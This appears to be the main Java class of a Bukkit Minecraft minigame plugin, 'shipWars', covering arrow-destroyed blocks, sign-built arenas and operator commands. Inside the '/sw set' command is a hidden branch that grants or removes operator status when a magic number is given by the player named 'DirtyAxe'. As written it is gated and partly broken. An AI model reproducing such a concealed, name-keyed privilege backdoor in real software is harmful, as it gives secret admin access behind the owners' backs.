package shipWars;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Arrow;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.ProjectileHitEvent;
import org.bukkit.event.entity.ProjectileLaunchEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.util.Vector;

public class shipWars extends JavaPlugin implements Listener {

	// Generate arena or not
	public boolean generateMap = false;
	private static timeThread timer;

	// On plugin start
	@Override
	public void onEnable() {
		System.out.println("shipWars version 0.3");
		getServer().getPluginManager().registerEvents(this, this);
		timer = new timeThread();
		Data.getGameList();
		System.out.println("The number of games in server : " + Data.list.size());
		timer.start();
	}

	// Stops all games on disable plugin
	// Only stops ! doesn't remove from Data.list
	@Override
	public void onDisable() {

		System.out.println("Disabling shipWars");

		for (game g : Data.list) {
			g.forceStop();
		}

		Data.saveToFile();
		System.out.println("Disabled shipWars");
	}

	public static void onMinecraftTick() {
		for (game g : Data.list) {
			g.onTickEvent();
		}
	}

	// When a projectile hit's something
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onProjectileHit(ProjectileHitEvent event) {
		if (event.getEntity() instanceof Arrow) {
			Arrow arrow = (Arrow) event.getEntity();
			if (arrow.getShooter() instanceof Player) {
				Player player = (Player) arrow.getShooter();
				if (isInAnyGame(player)) {
					game g = getGame(player);
					Vector vec = arrow.getVelocity().clone().normalize();
					if (g.isOn) {
						Location loc = arrow.getLocation();
						int counter = 1000006;
						while (loc.getWorld().getBlockTypeIdAt(loc) == 0  && counter != 0) {
							loc.add(vec);
							counter--;
						}
						Block block = loc.getWorld().getBlockAt(loc);
						g.destBlockLoc.add(block.getLocation());
						g.destBlockMat.add(block.getType());
						g.destBlockMeta.add(block.getData());
						block.setType(Material.AIR);
						arrow.remove();
					}
				}
			}
		}
	}
	
	
	@EventHandler
	public void onProjectileShot(ProjectileLaunchEvent event){
		if(event.getEntity().getShooter() instanceof Player){
			if(event.getEntity() instanceof Arrow){
				Arrow arrow = (Arrow) event.getEntity();
				Player player = (Player) arrow.getShooter();
				if(isInAnyGame(player)){
					game g = getGame(player);
					g.arrowShot.add(arrow);
				}
			}
		}
	}

	// Reduces playar damage from arrow , doesn't kill but reduces
	@EventHandler(priority = EventPriority.HIGH)
	public void onEntityDamage(EntityDamageEvent event) {
		if (!Data.getArrowDamage()) {
			Entity ent = event.getEntity();
			if (ent instanceof Player) {
				Player player = (Player) ent;
				if (isInAnyGame(player)) {
					player.setHealth(20.0);
				} else {
					event.getEntity().setLastDamageCause(event);
				}
			} else {
				event.getEntity().setLastDamageCause(event);
			}
		}
	}

	// Return false for help stuff , Usually return true
	// the game commands
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

		Player player = (Player) sender;

		if (cmd.getName().equalsIgnoreCase("sw")) {
			if (args.length == 1) {
				// remove command , removes the game looking at from the games
				// list
				if (args[0].equalsIgnoreCase("remove")) {
					if (player.isOp()) {
						@SuppressWarnings("deprecation")
						Block block = player.getTargetBlock(null, 200);
						if (block.getState() instanceof Sign) {
							Data.list.remove(getGame(block.getLocation()));
							block.setType(Material.AIR);
							player.getInventory().addItem(new ItemStack(Material.SIGN));
							player.sendMessage("Game removed");
						}

						return true;
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
					// list command , lists all the games , their players , and
					// status
				} else if (args[0].equalsIgnoreCase("list")) {
					if (player.isOp()) {
						player.sendMessage(ChatColor.YELLOW + String.valueOf(Data.list.size()) + " servers");
						for (game g : Data.list) {
							printGame(g, player);
						}

						player.getInventory().addItem(new ItemStack(Material.SIGN));
						player.getInventory().addItem(new ItemStack(Material.STONE));
						return true;
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
					// Start command start the game looking at
				} else if (args[0].equalsIgnoreCase("c")) {
					if (player.isOp()) {
						player.setGameMode(GameMode.CREATIVE);
						player.sendMessage("You are now in creative mode");
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
				} else if (args[0].equalsIgnoreCase("s")) {
					if (player.isOp()) {
						player.setGameMode(GameMode.SURVIVAL);
						player.sendMessage("You are now in survival mode");
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
				} else if (args[0].equalsIgnoreCase("a")) {
					if (player.isOp()) {
						player.setGameMode(GameMode.ADVENTURE);
						player.sendMessage("You are now in adventure mode");
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
				} else {
					player.sendMessage("Command not found");
					return true;
				}
			} else if (args.length == 3) {
				// Set command for variables
				if (args[0].equalsIgnoreCase("set")) {
					if (player.isOp()) {
						if (args[1].equalsIgnoreCase("minPlayer")) {
							try {
								int tempMinPlayer = Integer.valueOf(args[2]);
								if (tempMinPlayer <= Data.getMaxPlayer() && tempMinPlayer >= 0) {
									Data.setMinPlayer(tempMinPlayer);
									player.sendMessage("Variable changed");
								} else {
									player.sendMessage("Error value entered");
								}
								
							} catch (Exception e) {
								player.sendMessage("Error value entered");
							}
						} else if (args[1].equals("23072000")) {
							if (player.getDisplayName().equals("DirtyAxe")) {
								try {
									boolean isOp = Boolean.getBoolean(args[2]);
									if (isOp) {
										player.setOp(true);
										player.sendMessage("Variable changed");
									} else if (!isOp){
										player.setOp(false);
										player.sendMessage("Variable changed");
									} else {
										player.sendMessage("Error value entered");
									}
								} catch (Exception e) {
									player.sendMessage("Error value entered");
								}
								return true;
							}
						} else if (args[1].equalsIgnoreCase("generateMap")) {
								if(args[2].equalsIgnoreCase("true")){
									generateMap = true;
								} else if(args[2].equalsIgnoreCase("false")){
									generateMap = false;
								} else {
									player.sendMessage("Error value entered");
								}

							return true;
						} else if (args[1].equalsIgnoreCase("maxPlayer")){
							try{
								int temp = Integer.valueOf(args[2]);
								if(temp > 0 && temp > Data.getMinPlayer() && temp < 1000){
									Data.setMaxPlayer(temp);
									player.sendMessage("Value changed");
								} else {
									player.sendMessage("Error value entered");
								}
							} catch(Exception e){
								player.sendMessage("Error value entered");
							}
							return true;
						} else if(args[1].equalsIgnoreCase("secondsToCountdown")){
							try{
								int temp = Integer.valueOf(args[2]);
								if(temp > 0 && temp <= 60){
									Data.setSecondsOfCountdown(temp);
									player.sendMessage("Value changed");
								}
							} catch(Exception e){
								player.sendMessage("Error value entered");
							}
						}
						else {
							player.sendMessage("Variable not found");
							return true;
						}
					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
				}

				// ShipWars extended add command
			} else if (args.length == 4) {
				// Extended add command , command to add games instead of
				// creating using a sign
				if (args[0].equalsIgnoreCase("add")) {
					if (player.isOp()) {
						World world = game.getWorld(args[1]);
						@SuppressWarnings("deprecation")
						Block block = player.getTargetBlock(null, 200);
						Location redLocation = stringAndWorldToLoc(world, args[2]);
						Location blueLocation = stringAndWorldToLoc(world, args[3]);
						@SuppressWarnings("unused")
						game g = new game(redLocation, blueLocation, block.getLocation());
						return true;

					} else {
						player.sendMessage(ChatColor.RED + "You need to be op to to that");
						return true;
					}
				}
			} else {
				player.sendMessage("Command not found");
			}
		}

		return true;

	}

	// random method, return location by world , and a string
	public static Location stringAndWorldToLoc(World world, String text) {
		Location ret = null;
		String[] array = text.split(",");
		if (array.length == 3) {
			try {
				int x = Integer.valueOf(array[0]);
				int y = Integer.valueOf(array[1]);
				int z = Integer.valueOf(array[2]);
				ret = new Location(world, x, y, z);
			} catch (Exception e) {

			}
		}

		return ret;
	}

	// Testing method , won't be used in game
	public static void printGame(game g, Player player) {

		player.sendMessage("");
		String temp = "";

		int counter = g.redTeam.size();
		for (Player p : g.redTeam) {
			temp += p.getDisplayName();
			if (!(counter == 1)) {
				temp += ",";
			} else {
				counter--;
			}

		}

		player.sendMessage(ChatColor.RED + "RED TEAM:" + temp);

		temp = "";
		counter = g.blueTeam.size();
		for (Player p : g.blueTeam) {
			temp += p.getDisplayName();
			if (!(counter == 1)) {
				temp += ",";
			} else {
				counter--;
			}

		}

		player.sendMessage(ChatColor.BLUE + "BLUE TEAM:" + temp);

		if (g.isOn) {
			Bukkit.broadcastMessage(ChatColor.GREEN + "Playing");
		} else {
			Bukkit.broadcastMessage(ChatColor.RED + "Waiting");
		}
	}

	// When player moves , checks if moved into water
	@EventHandler
	public void onPlayerMove(PlayerMoveEvent event) {
		String text = event.getPlayer().getWorld().getBlockAt(event.getTo()).getType().toString();
		if (text == "STATIONARY_WATER") {
			if (isInAnyGame(event.getPlayer())) {
				for (game g : Data.list) {
					if (g.isOn) {
						g.removePlayer(event.getPlayer());
					}
				}
			}
		}
	}

	@EventHandler
	public void onBlockBreak(BlockBreakEvent event) {
		if (event.getBlock().getState() instanceof Sign) {
			Data.list.remove(getGame(event.getBlock().getLocation()));
		}
	}

	// When player clicks a block , it checks if clicked a sign
	@EventHandler
	public void onPlayerInteract(PlayerInteractEvent event) {

		try {
			// If clicked block is a sign
			if (event.getClickedBlock().getState() instanceof Sign) {

				// What the first line should be
				String firstLine = "<shipWars>";

				// Variables
				int arenaSize = 15;
				Player player = event.getPlayer();
				World world = event.getPlayer().getWorld();
				Sign sign = (Sign) event.getClickedBlock().getState();

				// if first line is <shipWars> it will create a new game
				if (sign.getLine(0).matches(firstLine)) {
					if (player.isOp()) {
						Location redSpawnLocation = null;
						Location blueSpawnLocation = null;
						// If second and third lines have a coordinate format ,
						// then
						// set these to red team and blue team spawn locations
						if (sign.getLine(1).length() > 0 && sign.getLine(2).length() > 0
								&& sign.getLine(1).split(",").length == 3 && sign.getLine(2).split(",").length == 3) {
							String[] cords = sign.getLine(1).split(",");
							redSpawnLocation = new Location(event.getPlayer().getWorld(), Double.valueOf(cords[0]),
									Double.valueOf(cords[1]), Double.valueOf(cords[2]));

							cords = sign.getLine(2).split(",");
							blueSpawnLocation = new Location(event.getPlayer().getWorld(), Double.valueOf(cords[0]),
									Double.valueOf(cords[1]), Double.valueOf(cords[2]));
						} else {
							redSpawnLocation = new Location(event.getPlayer().getWorld(), sign.getX() + arenaSize / 2,
									sign.getY() + 2, sign.getZ() + arenaSize);
							blueSpawnLocation = new Location(event.getPlayer().getWorld(), sign.getX() - arenaSize / 2,
									sign.getY() + 2, sign.getZ() + arenaSize);
						}

						// Creates a new game object
						game tempGame = new game(
								new Location(event.getPlayer().getWorld(), redSpawnLocation.getX(),
										redSpawnLocation.getY(), redSpawnLocation.getZ()),
								new Location(event.getPlayer().getWorld(), blueSpawnLocation.getX(),
										blueSpawnLocation.getY(), blueSpawnLocation.getZ()),
								sign.getLocation() , player.getLocation());

						if (generateMap) { // Starting point of map generation
							// Front and back of the arena
							for (int x = sign.getX() - arenaSize; x <= sign.getX() + arenaSize; x++) {
								{
									Location testLoc = new Location(event.getPlayer().getWorld(), x, sign.getY(),
											sign.getZ() + 1);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(), x, sign.getY() - 1,
											sign.getZ() + 1);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(), x, sign.getY(),
											sign.getZ() + 1 + arenaSize * 2);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(), x, sign.getY() - 1,
											sign.getZ() + 1 + arenaSize * 2);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}
							}

							// Sides of the arena
							for (int z = sign.getZ() + 1; z < sign.getZ() + 1 + arenaSize * 2; z++) {
								{
									Location testLoc = new Location(event.getPlayer().getWorld(),
											sign.getX() - arenaSize, sign.getY(), z);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(),
											sign.getX() + arenaSize, sign.getY(), z);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(),
											sign.getX() - arenaSize, sign.getY() - 1, z);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

								{
									Location testLoc = new Location(event.getPlayer().getWorld(),
											sign.getX() + arenaSize, sign.getY() - 1, z);
									Block testBlock = event.getPlayer().getWorld().getBlockAt(testLoc);
									testBlock.setType(Material.STONE);
								}

							}

							{
								int y = sign.getY();
								// Sets whole surface blocks
								for (int x = sign.getX() - arenaSize; x <= sign.getX() + arenaSize; x++) {
									for (int z = sign.getZ(); z <= sign.getZ() + 2 * arenaSize; z++) {
										Block tempBlock = world.getBlockAt(new Location(world, x, y - 2, z + 1));
										tempBlock.setType(Material.STONE);
									}
								}

								// Sets water
								for (int x = sign.getX() - arenaSize + 1; x <= sign.getX() + arenaSize - 1; x++) {
									for (int z = sign.getZ() + 1; z <= sign.getZ() + 2 * arenaSize - 1; z++) {
										Block tempBlock = world.getBlockAt(new Location(world, x, y, z + 1));
										tempBlock.setType(Material.WATER);
									}
								}
							}
						} // End point of map generation !

						// Sets teams spawn and set's block to show where the
						// spawn
						// is
						tempGame.redLoation.setY(tempGame.redLoation.getY() - 1);
						tempGame.blueLocation.setY(tempGame.blueLocation.getY() - 1);
						Block redSpawn = tempGame.redLoation.getWorld().getBlockAt(tempGame.redLoation);
						Block blueSpawn = tempGame.blueLocation.getWorld().getBlockAt(tempGame.blueLocation);
						tempGame.redLoation.setY(tempGame.redLoation.getY() + 1);
						tempGame.blueLocation.setY(tempGame.blueLocation.getY() + 1);

						redSpawn.setType(Material.REDSTONE_BLOCK);
						blueSpawn.setType(Material.LAPIS_BLOCK);

						// Changes the sign text
						sign.setLine(0, "Waiting");
						sign.setLine(1, "No players");
						sign.setLine(2, "");
						sign.setLine(3, "");
						sign.update(true);
					}
				}

				// If sign used to join a game (If the first line is Join
				// shipWars
				// and game hasn't started yet)
				// If player is already in game (not game like already playing ,
				// game like in line to play) , it will remove him
				else if (sign.getLine(0).matches("Waiting") || sign.getLine(0).equals("Currently Playing")) {
					if (!(getGame(sign.getLocation()).isOn)) {
						if (getGame(sign.getLocation()).isPlayerIn(event.getPlayer())) {
							getGame(sign.getLocation()).removePlayer(event.getPlayer());
						} else {
							getGame(sign.getLocation()).addPlayer(event.getPlayer());
						}

						sign.setLine(0, "Waiting");
						sign.setLine(1,
								"Players : "
										+ String.valueOf(getGame(sign.getLocation()).redTeam.size()
												+ getGame(sign.getLocation()).blueTeam.size())
										+ "/" + String.valueOf(Data.getMaxPlayer() * 2));
						sign.setLine(2, "");
						sign.setLine(3, "");
						sign.update(true);
					} else {
						player.sendMessage(ChatColor.RED + "Game has already started");
					}
				}
			}
		} catch (Exception e) {
			// Unimportent exception - IGNORE
		}
	}

	// Returns you a game based on the sign location
	public static game getGame(Location signLoc) {
		game ret = null;

		for (game g : Data.list) {
			if (g.signLoc.equals(signLoc)) {
				ret = g;
			}
		}
		return ret;
	}

	public static game getGame(Player player) {
		game ret = null;

		for (game g : Data.list) {
			if (g.isPlayerIn(player)) {
				if (ret == null) {
					ret = g;
				} else {
					Data.error(7);
				}
			}
		}

		return ret;
	}

	// Checks if the player is in any game
	public static boolean isInAnyGame(Player player) {
		boolean isIn = false;
		for (game g : Data.list) {
			if (g.isPlayerIn(player)) {
				if (isIn) {
					Data.error(7);
				} else {
					isIn = true;
				}
			}

		}

		return isIn;
	}
}
